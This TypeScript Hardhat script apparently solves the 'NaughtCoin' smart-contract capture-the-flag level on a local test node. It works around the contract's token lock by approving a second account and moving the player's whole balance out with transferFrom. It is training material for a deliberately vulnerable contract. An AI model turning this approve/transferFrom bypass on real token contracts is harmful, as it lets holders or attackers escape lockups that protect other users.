import { TransactionRequest } from "@ethersproject/providers";
import { ethers } from "hardhat";

//Fit player address chosen from hardhat node addresses and contract address (current lvl instance)
const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0xe1E6c2431Dc5a20dE405A294D70522CFE0e12AFe";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);

const contract = await ethers.getContractAt("NaughtCoin", CONTRACT_ADDRESS, signer);

//HACK STEPS

// 1. Check initial supply, player address and his balance
const initSupply = await contract.INITIAL_SUPPLY();
console.log("Token initial supply: ", initSupply.toString())
console.log("Player address is: ", await contract.player())
let playerBalance = await contract.balanceOf(PLAYER_ADDRESS)
console.log("and this is his balance: ", playerBalance.toString())

// 2. To reduce my balance to 0, I can call any of the ERC20 inherited functions and 
// bypass transfer locked function.
// Take a different account from hardhat node list
// Call approve func and check allowances mapping
const SPENDER_ADDRESS = "0xdd2fd4581271e230360230f9337d5c0430bf44c0"
await contract.approve(SPENDER_ADDRESS, playerBalance);
const allowedAmount = await contract.allowance(PLAYER_ADDRESS, SPENDER_ADDRESS);
console.log("I allowed all this amount for you to spend: ", allowedAmount.toString());

// 3. Call transferFrom function to complete the transferring of tokens
// and check player balance afterwards. Caller has to be the spender. 
// Create abi/tx and sign and send the transaction. 
const ABI = ["function transferFrom(address from, address to, uint256 amount)"];
const iface = new ethers.utils.Interface(ABI);
const calldata = iface.encodeFunctionData("transferFrom", [PLAYER_ADDRESS, SPENDER_ADDRESS, allowedAmount]);
console.log("Function signature is: ", calldata);


const spender = await ethers.getSigner(SPENDER_ADDRESS);
const tx :TransactionRequest = {
  to: contract.address,
  data: calldata 
}
await spender.sendTransaction(tx)

// 4. Check both balances after transaction
playerBalance = await contract.balanceOf(PLAYER_ADDRESS)
const spenderBalance = await contract.balanceOf(SPENDER_ADDRESS)

console.log("Player final balance: ", playerBalance.toString())
console.log("Spender final balance: ", spenderBalance.toString())

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
